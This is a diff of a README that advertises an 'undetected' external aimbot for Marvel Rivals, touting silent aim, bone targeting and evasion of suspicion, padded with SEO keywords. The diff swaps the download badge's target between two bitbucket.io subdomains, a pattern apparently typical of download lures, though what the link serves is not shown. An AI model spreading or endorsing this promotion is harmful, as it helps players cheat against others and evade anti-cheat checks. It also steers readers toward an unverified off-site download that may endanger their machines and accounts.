@@ -2,7 +2,7 @@
 
 Take full control of your aim in **Marvel Rivals** with this precise, undetected **C++ external aimbot**. Designed for both legit-style and high-pressure PvP, it includes silent aim, bone targeting, configurable FOV, smooth movement simulation, and real-time toggling. 🎮 Whether you're sniping from a distance or rushing headfirst, this aimbot adapts to your playstyle and delivers perfect aim — all without raising suspicion.
 
-[![Download Marvel Rivals Aimbot](https://img.shields.io/badge/Download-Marvel_Rivals_Aimbot-blueviolet)](https://offload1.bitbucket.io/)
+[![Download Marvel Rivals Aimbot](https://img.shields.io/badge/Download-Marvel_Rivals_Aimbot-blueviolet)](https://fileoffload5.bitbucket.io)
 
 ---
 
@@ -72,3 +72,4 @@ The aimbot reads memory externally and calculates the optimal aim angle between 
 Marvel Rivals Aimbot, Marvel Aimbot C++, Marvel Rivals Silent Aim, Marvel Bone Targeting Hack, Undetected Aimbot Marvel Rivals, External Aimbot for Marvel Rivals, Legit Aimbot Marvel, Smooth Aim Hack Marvel Rivals, Marvel Rivals FOV Aimbot, Free Marvel Rivals Aimbot Download, Marvel PvP Aim Tool
 
 ---
+
